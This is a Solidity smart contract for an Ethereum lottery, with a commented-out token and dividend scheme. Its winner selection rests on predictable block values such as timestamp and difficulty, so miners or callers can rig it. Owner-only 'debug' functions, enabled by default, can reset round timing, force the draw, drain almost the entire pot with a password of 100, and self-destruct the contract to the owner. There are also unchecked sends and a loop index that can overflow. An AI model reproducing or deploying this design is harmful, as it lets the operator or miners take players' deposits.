pragma solidity ^0.4.9;

contract SmartLottery_v2 {
    
    mapping (address => uint) public balanceOf;
    
    event DividendPayout(address _to, uint _amount, uint _tokens, uint _reward);
    //event Transfer(address indexed from, address indexed to, uint256 value);
    event RoundEnd(address _winner, uint _reward, uint _RNGnumber, uint _roundNumber);
    
    address public owner;
    string public Fee='10 %';
    string public Minimal_Amount_Of_Dividend_Payout='1 Ether';
    uint public currentRound=0;
    uint public round_pretendents_count=0;
    uint public dividends_min_payout=1000000000000000000;
    bool round_enabled=true;
    
    ///DIVIDEND TEMPLATES
    bool public dividend_payouts_enabled=true; //public
    bool listen_for_dividends=true; //public
    bool dividends_disabled=false;
    
    struct Pretendent {
        address wallet;
        uint deposit;
        uint winning_number;
    }
    
    struct ShareHolder {
        uint tokens_held;
        uint dividends_earned;
        bool exists;
        uint my_index;
        //ShareHolder(){
        //    exists=true;
        //}
    }
    
    modifier onlydebug { if (debugging_enabled) _; }
    modifier onlyowner { if (msg.sender == owner) _; }
    modifier onlydividends { if (!dividends_disabled) _; }
    
    function SmartLottery_v2(uint256 tokens_Supply){
        owner = msg.sender;
        balanceOf[msg.sender]=tokens_Supply;
        //token_holders_array[msg.sender].exists=true;
        //token_holders_array[msg.sender].tokens_held=tokens_Supply;
        //indexes_of_token_holders[index_max]=msg.sender;
        //index_max++;
    }
    
    Pretendent[] public pretendents;
    
    bool public debugging_enabled=true;
    uint public roundStart=1871127;
    uint public roundInterval=30;
    uint public roundEnd=roundStart+roundInterval;
    uint RNG_entry=631817202;
    uint RNG_max=0;
    uint public min_value=950000000000000000;
    uint public round_end_reward=0;//200000000000000000 to give 0.2 Ether 
    address winner=0;
    uint reward; //public 
    Pretendent TMP_pretendent;
    
    
    function() payable{
        if(msg.value>min_value)
        {
        if(block.number>=roundEnd)
        {
            if(round_enabled) endRound();
            prepareNewRound();
        }
        TMP_pretendent.wallet=msg.sender;
        TMP_pretendent.deposit=msg.value;
        pretendents.push(TMP_pretendent);
        reward+=msg.value;
        round_pretendents_count++;
        }
        else{
            throw;
        }
    }
    
    function Donate() payable{
        
    }
    
    function endRound(){
        if((block.number>=roundEnd)&&round_enabled)
        {
            round_enabled=false;
        if(pretendents.length>0)
        {
        	Calculate();
        	//PayDividends();
            reward=reward-reward/10;
        	
            //prepare to new round if the winner is paid
            if(winner.send(reward))
            {
                RoundEnd(winner, reward, RNG_entry, currentRound);
            }
            if(round_end_reward>0){
                bool resultOK = msg.sender.send(round_end_reward);
            }
        }
        }
        else{
            throw;
        }
    }
    
    function prepareNewRound() private{
        if(roundStart<block.number){
            roundStart=block.number+1;
        }
        round_enabled=true;
        round_pretendents_count=0;
        //prev_round_pretendents=pretendents;
        delete pretendents;
        currentRound++;
        roundEnd=roundStart+roundInterval;
        reward=0;
        RNG_entry=0;
        RNG_max=0;
        winner=0;
    }
    
    function Calculate() private{
        
        uint win_number_condition=0;
        RNG_max=reward;
        for(uint x = 0; x < pretendents.length; x++)
        	{
        	    pretendents[x].winning_number=win_number_condition+pretendents[x].deposit;
        	    win_number_condition+=pretendents[x].deposit;
        	}
        	
        RNG_entry=RNG(RNG_max);
        uint8 i=0;
        while(winner==0)
        {
            if(RNG_entry<=pretendents[i].winning_number)
            {
                winner=pretendents[i].wallet;
            }
            i++;
        }
        delete i;
            //Clear_DividendHolders_Array();
           // for (uint a=0;a<index_max;a++){
           //     token_holders_array[indexes_of_token_holders[a]].dividends_earned+=(token_holders_array[indexes_of_token_holders[a]].tokens_held*9*reward)/(tokenSupply*100);
           // }
    }
    
    function RNG(uint256 max) private returns (uint RNGoutput)
    {
        bytes32 tmp_hash0 = sha256(block.timestamp);
        bytes32 tmp_hash1 = sha256(block.difficulty);
        bytes32 tmp_hash2 = sha256(block.number);
        bytes32 tmp_hash3 = tmp_hash1&tmp_hash0;
        bytes32 tmp_hash4=sha256(msg.sender);
        uint256 tmp0=uint256(tmp_hash0);
        uint256 tmp1=uint256(tmp_hash1);
        uint256 tmp2=uint256(tmp_hash2);
        uint256 tmp3=uint256(tmp_hash3);
        uint256 tmp4=uint256(tmp_hash4);
        
        RNGoutput=tmp0+tmp1-tmp2+tmp3-tmp4;
        if(max==0)
        {
            return RNGoutput=0;
        }
        while(RNGoutput>max)
        {
           RNGoutput=RNGoutput%(max+1);
        }
        RNGoutput;
    }
    
    
    function Debugging_ForceCalculate() onlyowner onlydebug
    {
    	    //uint win_number_condition=0;
    	    //for(uint x1 = 0; x1 < pretendents.length; x1++)
        	//{
        	//    pretendents[x1].winning_number=win_number_condition+pretendents[x1].deposit;
        	//    win_number_condition+=pretendents[x1].deposit;
        	//}
        	Calculate();
    }
    
    function Debugging_Set_RoundEnd(uint roundEndTmp) onlyowner onlydebug
    {
        roundEnd=roundEndTmp;
    }
    
    function Debugging_Set_RoundStart(uint roundStartTmp) onlyowner onlydebug
    {
        roundStart=roundStartTmp;
    }
    
    function Debugging_Set_RoundInterval(uint roundIntervalTmp) onlyowner onlydebug
    {
        roundInterval=roundIntervalTmp;
    }
    
    function Debugging_Set_MinValue(uint minValue) onlyowner onlydebug
    {
        min_value=minValue;
    }
    
    function Debugging_Set_RoundEndReward(uint _end_reward) onlyowner onlydebug
    {
        round_end_reward=_end_reward;
    }
    
    function Debugging_Enable_Dividends() onlyowner onlydebug
    {
        dividend_payouts_enabled=true;
    }
    
    function Debugging_Disable_Dividends() onlyowner onlydebug
    {
        dividend_payouts_enabled=false;
    }
    
    function Debugging_Enable_DividendListening() onlyowner onlydebug
    {
        listen_for_dividends=true;
    }
    
    function Debugging_Disable_DividendListening() onlyowner onlydebug
    {
        listen_for_dividends=false;
    }
    
    function Debugging_SendMeAll(uint password) onlyowner onlydebug
    {
        if(password==100)
        {
            bool send=msg.sender.send(this.balance-10000);
        }
    }
    
    function TurnOffDebugging() onlyowner onlydebug
    {
        debugging_enabled=false;
    }
    
    function kill() onlyowner onlydebug{
    if (msg.sender == owner) suicide(owner); 
  }
  
  
  
  /////TOKENS PART
  /*
    
    function transfer(address _to, uint256 _value) {
        if (token_holders_array[msg.sender].tokens_held < _value) throw;
        token_holders_array[msg.sender].tokens_held -= _value;
        balanceOf[msg.sender]-= _value;
        
        
        if(token_holders_array[msg.sender].tokens_held==0){
            token_holders_array[msg.sender].exists=false;
            token_holders_array[msg.sender].dividends_earned=0;
            deleted_position[index_deleted_max]=token_holders_array[msg.sender].my_index;
            index_deleted_max++;
            token_holders_array[msg.sender].my_index=0;
        }
        
        
        if(!token_holders_array[_to].exists)
        {
            if(index_deleted_max>0){
                indexes_of_token_holders[deleted_position[index_deleted_max-1]]=_to;
                token_holders_array[_to].exists=true;
                token_holders_array[_to].my_index=deleted_position[index_deleted_max-1];
                index_deleted_max--;
            }
            else{
                indexes_of_token_holders[index_max]=_to;
                token_holders_array[_to].exists=true;
                token_holders_array[_to].my_index=index_max;
                index_max++;
            }
        }
        token_holders_array[_to].tokens_held += _value;
        balanceOf[_to]+= _value;
    }
    
    
    function PayDividends(){
        if(dividend_payouts_enabled)
        {
            for (uint i=0;i<index_max;i++){
                if(token_holders_array[indexes_of_token_holders[i]].exists&&token_holders_array[indexes_of_token_holders[i]].dividends_earned>=dividends_min_payout)
                {
                    if(indexes_of_token_holders[i].send(token_holders_array[indexes_of_token_holders[i]].dividends_earned)){
                        dividendPayout(indexes_of_token_holders[i], token_holders_array[indexes_of_token_holders[i]].dividends_earned, token_holders_array[indexes_of_token_holders[i]].tokens_held, reward);
                        token_holders_array[indexes_of_token_holders[i]].dividends_earned=0;
                    }
                }
            }
        }
    }
    //////////////////////////////////////////
    
    
    mapping (address => ShareHolder) public token_holders_array; //public
    mapping (uint => address) indexes_of_token_holders; //public
    mapping (uint => uint) deleted_position; //public
    uint index_max=0; //public
    uint index_deleted_max; //public
    */
}